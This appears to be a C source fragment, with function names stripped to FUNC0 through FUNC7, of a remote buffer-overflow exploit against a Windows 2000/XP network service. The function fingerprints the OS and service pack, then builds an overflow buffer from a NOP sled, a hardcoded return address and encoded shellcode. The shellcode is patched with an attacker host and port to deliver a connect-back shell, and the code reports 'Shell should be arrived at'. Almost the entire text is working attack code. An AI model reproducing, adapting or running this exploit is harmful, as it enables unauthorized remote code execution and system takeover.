#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  shellc0de ;

/* Variables and functions */
 int /*<<< orphan*/  CLIENT_VERSION ; 
 int /*<<< orphan*/  INTERFACE_IP ; 
 char* RET ; 
 char* RET_XP ; 
 int SIZEOF ; 
 int /*<<< orphan*/  USERPROFILE_COMPANY ; 
 int /*<<< orphan*/  USERPROFILE_DATE ; 
 int /*<<< orphan*/  USERPROFILE_LICENSE ; 
 int /*<<< orphan*/  USERPROFILE_NAME ; 
 int /*<<< orphan*/  WINDOMAIN ; 
 int /*<<< orphan*/  WINHOST ; 
 int /*<<< orphan*/  WINUSER ; 
 int /*<<< orphan*/  FUNC0 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC2 (char*,...) ; 
 int FUNC3 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (int,int,char*,int,char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,int /*<<< orphan*/ ) ; 

int FUNC7(int sock, char *rhost, int rport)
{
        int size,i=4,os,sp;
        char buffer[SIZEOF];
        char shellc0de[] =
        "\xeb\x02\xeb\x0f\x66\x81\xec\x04\x08\x8b\xec\x83\xec\x50\xe8\xef"
        "\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\xba\x01\x80\x33\x95"
        "\x43\xe2\xfa\x7e\xfa\xa6\x4e\x26\xa5\xf1\x1e\x96\x1e\xd5\x99\x1e"
        "\xdd\x99\x1e\x54\x1e\xc9\xb1\x9d\x1e\xe5\xa5\x96\xe1\xb1\x91\xad"
        "\x8b\xe0\xdd\x1e\xd5\x8d\x1e\xcd\xa9\x96\x4d\x1e\xce\xed\x96\x4d"
        "\x1e\xe6\x89\x96\x65\xc3\x1e\xe6\xb1\x96\x65\xc3\x1e\xc6\xb5\x96"
        "\x45\x1e\xce\x8d\xde\x1e\xa1\x0f\x96\x65\x96\xe1\xb1\x81\x1e\xa3"
        "\xae\xe1\xb1\x8d\xe1\x93\xde\xb6\x4e\xe0\x7f\x56\xca\xa6\x5c\xf3"
        "\x1e\x99\xca\xca\x1e\xa9\x1a\x18\x91\x92\x56\x1e\x8d\x1e\x56\xae"
        "\x54\xe0\x34\x56\x16\x79\xd5\x1e\x79\x14\x79\xb5\x97\x95\x95\xfd"
        "\xec\xd0\xed\xd4\xff\x9f\xff\xde\xff\x95\x7d\xe3\x6a\x6a\x6a\xa6"
        "\x5c\x52\xd0\x69\xe2\xe6\xa7\xca\xf3\x52\xd0\x95\xa6\xa7\x1d\xd8"
        "\x97\x1e\x48\xf3\x16\x7e\x91\xc4\xc4\xc6\x6a\x45\x1c\xd0\x91\xfd"
        "\xe7\xf0\xe6\xe6\xff\x9f\xff\xde\xff\x95\x7d\xd3\x6a\x6a\x6a\x1e"
        "\xc8\x91\x1c\xc8\x12\x1c\xd0\x02\x52\xd0\x69\xc2\xc6\xd4\xc6\x52"
        "\xd0\x95\xfa\xf6\xfe\xf0\x52\xd0\x91\xe1\xd4\x95\x95\x1e\x58\xf3"
        "\x16\x7c\x91\xc4\xc6\x6a\x45\xa6\x4e\xc6\xc6\xc6\xc6\xff\x94\xff"
        "\x97\x6a\x45\x1c\xd0\x31\x52\xd0\x69\xf6\xfa\xfb\xfb\x52\xd0\x95"
        "\xf0\xf6\xe1\x95\x1e\x58\xf3\x16\x7c\x91\xc4\x6a\xe0\x12\x6a\xc0"
        "\x02\xa6\x4e\x26\x97\x1e\x40\xf3\x1c\x8f\x96\x46\xf3\x52\x97\x97"
        "\x0f\x96\x46\x52\x97\x55\x3d\x94\x94\xff\x85\xc0\x6a\xe0\x31\x6a"
        "\x45\xfd\xf0\xe6\xe6\xd4\xff\x9f\xff\xde\xff\x95\x7d\x51\x6b\x6a"
        "\x6a\xa6\x4e\x52\xd0\x39\xd1\x95\x95\x95\x1c\xc8\x25\x1c\xc8\x2d"
        "\x1c\xc8\x21\x1c\xc8\x29\x1c\xc8\x55\x1c\xc8\x51\x1c\xc8\x5d\x52"
        "\xd0\x4d\x94\x94\x95\x95\x1c\xc8\x49\x1c\xc8\x75\x1e\xd8\x31\x1c"
        "\xd8\x71\x1c\xd8\x7d\x1c\xd8\x79\x18\xd8\x65\xc4\x18\xd8\x39\xc4"
        "\xc6\xc6\xc6\xff\x94\xc6\xc6\xf3\x52\xd0\x69\xf6\xf8\xf3\x52\xd0"
        "\x6b\xf1\x95\x1d\xc8\x6a\x18\xc0\x69\xc7\xc6\x6a\x45\xfd\xed\xfc"
        "\xe1\xc1\xff\x94\xff\xde\xff\x95\x7d\xcd\x6b\x6a\x6a\x6a";

        size=FUNC3(sock,buffer,SIZEOF,0);
        if(buffer[0]!=0x30||buffer[1]!=0x11) {
                FUNC2("error: wrong data received\r\n");
                return -1;
                }
        buffer[28]=0x00;buffer[36]=0x01;
        FUNC4(sock,buffer,size,0);
        FUNC1(buffer,0,SIZEOF);
        FUNC2("[+] Gathering %-30s     ...","information");
        for(size=0;size<4096;size+=FUNC3(sock,&buffer[size],SIZEOF,0));

        if(buffer[0]!=0x10||buffer[1]!=0x27) {
                FUNC2("error: wrong data received\r\n");
                return -1;
        }
        FUNC2("Done\r\n");
        sp=(unsigned int)buffer[37];
        FUNC2("[i] Operating system : ");
        if(buffer[16]==0x28||buffer[17]==0x0a) {
        os=1;
        FUNC2("WinXP");
        } else {
                FUNC2("Win2000");
                os=0;
        }
        FUNC2("\r\n[i] Service Pack     : %s\r\n",&buffer[37]);
        FUNC2("[+] Setting shellc0de for this %-15s   ...","version");
        FUNC5(os,sp,rhost,rport,shellc0de);

        FUNC1(&buffer[2],0,SIZEOF-2);
        FUNC6(&buffer[175],WINUSER);
        FUNC1(&buffer[416],0x90,180);
if(os==0)
        FUNC0(&buffer[516],RET,4);
else
        FUNC0(&buffer[516],RET_XP,4);
        FUNC0(&buffer[520],shellc0de,sizeof(shellc0de));
        FUNC6(&buffer[1200],WINHOST);FUNC6(&buffer[975],USERPROFILE_NAME);
        FUNC6(&buffer[1295],USERPROFILE_COMPANY);FUNC6(&buffer[1495],USERPROFILE_LICENSE);
        FUNC6(&buffer[1755],USERPROFILE_DATE);FUNC6(&buffer[2015],WINHOST);
        FUNC6(&buffer[2275],INTERFACE_IP);FUNC6(&buffer[2535],WINDOMAIN);
        FUNC6(&buffer[2795],CLIENT_VERSION);
        FUNC2("Done\r\n");
        FUNC2("[+] Sending evil %-30s  ...","packet");
        FUNC4(sock,buffer,SIZEOF,0);
        FUNC1(buffer,0,SIZEOF);
        size=FUNC3(sock,buffer,SIZEOF,0);

        if(buffer[0]!=0x32||buffer[1]!=0x11) {
                FUNC2("Patched\r\n");
                return -1;
        }
        FUNC2("Done\r\n");
        FUNC2("[i] Shell should be arrived at %s:%d\r\n",rhost,rport);
        return 0;
}